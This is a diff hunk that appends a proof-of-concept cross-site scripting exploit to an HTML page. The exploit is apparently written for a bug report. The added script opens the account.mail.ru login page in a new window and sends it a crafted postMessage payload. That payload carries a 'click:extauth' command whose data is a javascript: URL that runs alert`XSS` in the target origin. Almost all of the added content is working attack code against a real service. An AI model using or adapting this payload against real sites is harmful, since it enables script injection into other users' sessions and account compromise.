@@ -22,3 +22,17 @@
 		</script>
 	</body>
 </html>
+
+
+#########################################
+
+
+<a href="#" onclick="xss()">click me</a>
+    <script>
+function xss() {
+    var win = window.open('https://account.mail.ru/login', '_blank');
+    setTimeout(function() {
+        win.postMessage('__cors__{"__cors__":"foo","cmd":"click:extauth","data":"javascript:alert`XSS`"}', '*');
+    }, 500);
+}
+    </script>
